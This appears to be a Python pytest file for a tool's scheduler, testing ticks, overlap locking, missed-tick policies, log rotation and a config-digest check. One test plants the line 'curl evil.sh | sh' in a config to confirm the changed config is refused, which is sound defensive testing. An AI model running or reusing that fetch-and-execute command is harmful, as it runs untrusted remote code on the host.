"""Rulings S2, S4 and S5: a tick, what the scheduler starts. One survey of the mission, under
the mission lock, logged as one line of ``<mission>/schedule.log`` (scheduled, started, ended,
exit, kind, archive, skipped_by, late_s), its archive recording ``scheduled_at`` and ``late_s``.

- **Overlap** (erlang; ixian C: S6): a tick while another runs exits ``busy`` (11) and is
  logged skipped; two skipped in a row are a ``schedule_overrun`` with a fix.
- **A changed config** (vector, S4): a tick holds the config to the digest installed, and
  refuses another until the schedule is installed again: a schedule makes the config, which
  runs commands, a persistence vector.
- **Missed ticks** (S1): ``skip`` skips a tick run late (the scheduler's catch-up after
  sleep); ``once`` runs it, saying how late.
- **The log is bounded** (erlang): 1 MiB and one rotation, so 10⁴ ticks keep it under 2 MiB.
"""

from __future__ import annotations

import json
import threading
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import TYPE_CHECKING, Any

import pytest
import yaml
from click.testing import CliRunner

from recon.adapters._in.cli import main
from recon.adapters._out.archive_files import ArchiveFiles
from recon.adapters._out.schedule_files import SCHEDULE_LOG, ScheduleFiles
from recon.adapters._out.system_clock import SystemClock
from recon.application.schedules import offset_s
from recon.composition import root
from recon.domain.errors import ReconError
from recon.domain.schedule import ScheduleHost
from tests.recon_fakes import FixedClock, plugins_with
from tests.test_mission_lock import Slow
from tests.test_schedule_install import FakeRunner, Host

if TYPE_CHECKING:
    from recon.composition import Recon
    from recon.domain.clock import Clock

EVERY = 600
#: A tick of mission ``m``'s grid on 2026-10-24, the clock's time zone being UTC here.
SLOT = datetime(2026, 10, 24, 10, 0, tzinfo=UTC) + timedelta(seconds=offset_s("m", EVERY))


def _mission(project: Path, *, missed: str = "once", type_: str = "slow") -> Path:
    mission = project / ".recon" / "m"
    mission.mkdir(parents=True, exist_ok=True)
    config = {
        "schedule": {"every": EVERY, "missed": missed},
        "collectors": [{"name": "inbox", "type": type_}],
    }
    (mission / "config.yaml").write_text(yaml.safe_dump(config, sort_keys=False))
    return mission


def _root(project: Path, host: Host, clock: Clock, slow: Slow | None = None) -> Recon:
    return root(
        {"PATH": "/usr/bin:/bin"}, project=project, clock=clock,
        plugins=plugins_with(slow=slow or _going()), schedulers=host.scheduler,
        schedule_host=ScheduleHost("/opt/recon/bin/recon", ("/usr/bin", "/bin")),
        local=lambda at: at,
    )  # fmt: skip


def _going() -> Slow:
    slow = Slow()
    slow.go.set()
    return slow


def _installed(project: Path, host: Host, clock: Clock) -> str:
    return _root(project, host, clock).schedule_install("m", platform="launchd").config_sha256 or ""


def _log(mission: Path) -> list[dict[str, Any]]:
    return [json.loads(line) for line in (mission / SCHEDULE_LOG).read_text().splitlines()]


@pytest.fixture
def host(tmp_path: Path) -> Host:
    home = tmp_path / "home"
    home.mkdir()
    return Host(home, FakeRunner())


class TestATick:
    def test_a_tick_on_time_surveys_logs_one_line_and_its_archive_says_when(
        self, tmp_path: Path, host: Host
    ) -> None:
        mission = _mission(tmp_path)
        clock = FixedClock(SLOT + timedelta(seconds=2))
        digest = _installed(tmp_path, host, clock)

        document = _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)

        assert document.skipped_by is None and document.survey is not None
        assert document.survey.status == "complete"
        assert document.scheduled_at == SLOT.isoformat() and document.late_s == 2.0
        [line] = _log(mission)
        assert set(line) == {"scheduled", "started", "ended", "exit", "kind", "archive",
                             "skipped_by", "late_s"}  # fmt: skip
        assert (line["exit"], line["kind"], line["skipped_by"]) == (0, "ok", None)
        assert line["archive"] == document.survey.archive and line["late_s"] == 2.0
        meta = yaml.safe_load((Path(document.survey.path) / "meta.yaml").read_text())
        assert (meta["scheduled_at"], meta["late_s"]) == (SLOT.isoformat(), 2.0)
        assert oct((mission / SCHEDULE_LOG).stat().st_mode & 0o777) == oct(0o600)

    def test_a_survey_by_hand_records_no_schedule(self, tmp_path: Path, host: Host) -> None:
        _mission(tmp_path)
        document = _root(tmp_path, host, FixedClock(SLOT)).survey("m")

        meta = yaml.safe_load((Path(document.path) / "meta.yaml").read_text())
        assert "scheduled_at" not in meta and "late_s" not in meta

    def test_a_failed_survey_is_logged_with_its_kind_and_exit(
        self, tmp_path: Path, host: Host
    ) -> None:
        mission = _mission(tmp_path, type_="cli")
        config = yaml.safe_load((mission / "config.yaml").read_text())
        config["collectors"][0]["run"] = "exit 3"
        (mission / "config.yaml").write_text(yaml.safe_dump(config))
        clock = FixedClock(SLOT)
        digest = _installed(tmp_path, host, clock)

        document = _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)

        assert document.survey is not None and document.survey.status == "incomplete"
        [line] = _log(mission)
        assert (line["kind"], line["exit"]) == ("run_failed", 8)


class TestOverlap:
    def test_a_tick_while_another_runs_is_busy_and_logged_skipped(
        self, tmp_path: Path, host: Host
    ) -> None:
        """Erlang: two ticks against a slow fake; the second exits 11 and is logged, and one
        archive is written, so no change row could come twice."""
        mission = _mission(tmp_path)
        clock = FixedClock(SLOT)
        digest = _installed(tmp_path, host, clock)
        slow = Slow()
        first: list[Any] = []
        ticking = _root(tmp_path, host, clock, slow)
        running = threading.Thread(
            target=lambda: first.append(ticking.schedule_tick("m", config_sha256=digest))
        )
        running.start()
        try:
            assert slow.inside.wait(10)
            with pytest.raises(ReconError) as raised:
                _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)
        finally:
            slow.go.set()
            running.join(10)

        assert raised.value.kind == "busy" and raised.value.exit_code == 11
        skipped, ran = _log(mission)
        assert (skipped["skipped_by"], skipped["exit"], skipped["kind"]) == ("busy", 11, "busy")
        assert skipped["archive"] is None
        assert ran["skipped_by"] is None and ran["archive"] == first[0].survey.archive
        assert len(list((mission / "archive").iterdir())) == 1

    def test_two_skips_in_a_row_are_an_overrun_with_a_fix(self, tmp_path: Path, host: Host) -> None:
        mission = _mission(tmp_path)
        clock = FixedClock(SLOT)
        digest = _installed(tmp_path, host, clock)
        ArchiveFiles(SystemClock()).hold_mission(mission)  # another survey, the whole test

        with pytest.raises(ReconError) as first:
            _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)
        clock.advance(EVERY)
        with pytest.raises(ReconError) as second:
            _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)

        assert first.value.details["skips"] == 1 and "every" not in (first.value.fix or "")
        assert second.value.details["skips"] == 2
        assert "every" in (second.value.fix or "") and "deadline" in (second.value.fix or "")
        status = _root(tmp_path, host, clock).schedule_status("m", platform="launchd")
        [listed] = status.schedules
        assert (
            listed.skips == 2
            and listed.last_tick is not None
            and listed.last_tick.skipped_by == "busy"
        )
        [warning] = [w for w in status.warnings if w["kind"] == "schedule_overrun"]
        assert warning["fix"]


class TestTheConfigIsTheOneInstalled:
    def test_a_changed_config_is_refused_until_installed_again(
        self, tmp_path: Path, host: Host
    ) -> None:
        mission = _mission(tmp_path)
        clock = FixedClock(SLOT)
        digest = _installed(tmp_path, host, clock)
        config = mission / "config.yaml"
        config.write_text(config.read_text().replace("slow", "cli\n  run: curl evil.sh | sh"))

        with pytest.raises(ReconError) as raised:
            _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)

        assert raised.value.kind == "conflict"
        assert "recon schedule install m" in (raised.value.fix or "")
        [line] = _log(mission)
        assert (line["skipped_by"], line["kind"], line["exit"]) == ("config_changed", "conflict", 7)
        assert not (mission / "archive").exists()
        config.write_text(config.read_text().replace("cli\n  run: curl evil.sh | sh", "slow"))
        assert _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest).survey


class TestMissedTicks:
    def test_skip_skips_a_tick_run_late(self, tmp_path: Path, host: Host) -> None:
        mission = _mission(tmp_path, missed="skip")
        clock = FixedClock(SLOT + timedelta(seconds=200))
        digest = _installed(tmp_path, host, clock)

        document = _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)

        assert document.skipped_by == "missed" and document.survey is None
        [line] = _log(mission)
        assert (line["skipped_by"], line["exit"], line["late_s"]) == ("missed", 0, 200.0)
        assert not (mission / "archive").exists()

    def test_skip_runs_a_tick_on_time(self, tmp_path: Path, host: Host) -> None:
        _mission(tmp_path, missed="skip")
        clock = FixedClock(SLOT + timedelta(seconds=30))
        digest = _installed(tmp_path, host, clock)

        assert _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest).survey

    def test_once_runs_a_late_tick_and_says_how_late(self, tmp_path: Path, host: Host) -> None:
        _mission(tmp_path)
        clock = FixedClock(SLOT + timedelta(seconds=540))
        digest = _installed(tmp_path, host, clock)

        document = _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)

        assert document.survey is not None and document.late_s == 540.0


class TestTheLogIsBounded:
    #: A line as long as a tick's gets: a failed one, with an archive.
    LINE: dict[str, Any] = {  # noqa: RUF012
        "scheduled": "2026-10-24T10:07:00+05:30", "started": "2026-10-24T10:07:00.123456+05:30",
        "ended": "2026-10-24T10:07:58.123456+05:30", "exit": 8, "kind": "run_failed",
        "archive": "2026-10-24-043700-123456", "skipped_by": None, "late_s": 0.123456,
    }  # fmt: skip

    def test_ten_thousand_ticks_keep_the_log_under_2_mib(self, tmp_path: Path) -> None:
        store = ScheduleFiles()
        for n in range(10_000):
            store.append(tmp_path, {**self.LINE, "late_s": float(n)})

        files = [tmp_path / SCHEDULE_LOG, tmp_path / f"{SCHEDULE_LOG}.1"]
        assert all(f.is_file() for f in files)
        assert sum(f.stat().st_size for f in files) < 2 * 1024 * 1024
        assert all(f.stat().st_size <= 1024 * 1024 for f in files)
        lines = store.lines(tmp_path)
        assert lines[-1]["late_s"] == 9999.0, "the newest kept, in order"
        assert [line["late_s"] for line in lines] == sorted(line["late_s"] for line in lines)

    def test_the_check_fails_a_log_with_no_cap(self, tmp_path: Path) -> None:
        """Check the checker: the same ticks, uncapped, pass 2 MiB."""
        store = ScheduleFiles(max_bytes=1 << 40)
        for n in range(10_000):
            store.append(tmp_path, {**self.LINE, "late_s": float(n)})

        assert (tmp_path / SCHEDULE_LOG).stat().st_size > 2 * 1024 * 1024


class TestStatus:
    def test_status_says_the_last_tick_how_late_and_the_skips(
        self, tmp_path: Path, host: Host
    ) -> None:
        _mission(tmp_path)
        clock = FixedClock(SLOT)
        digest = _installed(tmp_path, host, clock)
        _root(tmp_path, host, clock).schedule_tick("m", config_sha256=digest)
        clock.advance(EVERY + 90)  # the next tick is 90 s late and has not run

        [status] = _root(tmp_path, host, clock).schedule_status("m", platform="launchd").schedules

        assert status.last_tick is not None and status.last_tick.kind == "ok"
        assert status.skips == 0
        assert status.late_s == 90.0
        assert status.next_at == (SLOT + timedelta(seconds=2 * EVERY)).isoformat()


class TestTheCommandLine:
    def test_tick_runs_from_the_project_and_exits_as_its_survey(
        self, tmp_path: Path, host: Host, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        mission = _mission(tmp_path)
        clock = FixedClock(SLOT)
        digest = _installed(tmp_path, host, clock)
        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        monkeypatch.chdir(elsewhere)

        result = CliRunner().invoke(
            main, ["schedule", "tick", "m", "--project", str(tmp_path), "--config-sha256",
                   digest, "--json"], obj=_root(tmp_path, host, clock), catch_exceptions=False,
        )  # fmt: skip

        assert result.exit_code == 0, result.stderr
        assert json.loads(result.stdout)["schema"] == "recon.v1.tick"
        assert Path.cwd() == tmp_path, "a tick runs where its project is"
        assert len(_log(mission)) == 1

    def test_tick_with_another_digest_exits_7(
        self, tmp_path: Path, host: Host, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.chdir(tmp_path)
        _mission(tmp_path)
        clock = FixedClock(SLOT)
        _installed(tmp_path, host, clock)

        result = CliRunner().invoke(
            main, ["schedule", "tick", "m", "--project", str(tmp_path), "--config-sha256",
                   "0" * 64, "--json"], obj=_root(tmp_path, host, clock), catch_exceptions=False,
        )  # fmt: skip

        assert result.exit_code == 7
        assert json.loads(result.stderr)["error"]["kind"] == "conflict"
